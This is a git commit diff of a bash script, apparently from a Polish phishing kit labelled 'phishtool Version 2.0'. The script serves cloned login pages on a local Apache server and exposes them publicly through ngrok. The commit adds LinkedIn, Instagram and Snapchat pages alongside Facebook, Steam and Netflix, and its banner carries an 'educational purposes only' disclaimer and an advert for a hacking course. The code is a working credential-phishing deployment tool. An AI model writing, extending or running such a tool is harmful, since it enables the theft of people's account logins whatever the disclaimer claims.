d8e78a38dce0d443ab31bb072521374a5b073a98
Przemysław Szmaj <37410338+PSZMAJ@users.noreply.github.com>
2022-05-25 15:54:10 +0200

    v2

--- run.sh
+++ run.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 sudo service apache2 start
 
+
 facebook_login_page()
 {
 	echo "wybrales fb";
@@ -18,6 +19,7 @@ stream_login_page()
 	./ngrok http 80
 	sudo rm /var/www/html/index.html
 }
+
 netflix_login_page()
 {
 	echo "wybrales Netflixa";
@@ -27,7 +29,30 @@ netflix_login_page()
 	sudo rm /var/www/html/index.html
 }
 
-
+linkedin_login_page()
+{
+	echo "wybrales Linkedin";
+	sudo rm /var/www/html/index.html
+	sudo cp linkedin/index.html /var/www/html/index.html
+	./ngrok http 80
+	sudo rm /var/www/html/index.html
+}
+instagram_login_page()
+{
+	echo "wybrales Instagram";
+	sudo rm /var/www/html/index.html
+	sudo cp instagram/index.html /var/www/html/index.html
+	./ngrok http 80
+	sudo rm /var/www/html/index.html
+}
+snapchat_login_page()
+{
+	echo "wybrales Snapchat";
+	sudo rm /var/www/html/index.html
+	sudo cp snapchat/index.html /var/www/html/index.html
+	./ngrok http 80
+	sudo rm /var/www/html/index.html
+}
 
 exit_work()
 {
@@ -35,17 +60,21 @@ exit_work()
 }
 
 
-
-echo "Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 2.0"
+echo " ------------------------------------------------------------------------------ "
+echo "   Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 2.0"
+echo " ------------------------------------------------------------------------------ "
 sleep 2
-echo "kup kurs na www.ehaker.pl"
-sleep 2
+echo -e "\e[5m  KUP KURS NA WWW.EHAKER.PL \e[0m"
+sleep 1
 echo "Wybierz opcje"
 echo "================="
-echo "[1] --->Facebook"
-echo "[2] --->Steam"
-echo "[3] --->Netflix"
-echo "[11] --->EXIT"
+echo -e "\e[31m  [1] Facebook\e[0m"
+echo -e "\e[31m  [2] Steam\e[0m"
+echo -e "\e[31m  [3] Netflix\e[0m"
+echo -e "\e[31m  [4] Linkedin\e[0m"
+echo -e "\e[31m  [5] Instagram\e[0m"
+echo -e "\e[31m  [6] Snapchat\e[0m"
+echo -e "\e[92m  [11] EXIT \e[0m"
 echo "================="
 
 
@@ -58,6 +87,9 @@ case "$opcja" in
   "1") facebook_login_page ;;
   "2") stream_login_page ;;
   "3") netflix_login_page ;;
+  "4") linkedin_login_page ;;
+  "5") instagram_login_page ;;
+  "6") snapchat_login_page ;;
   "11") exit_work ;;
   *)  ./run2.sh
   
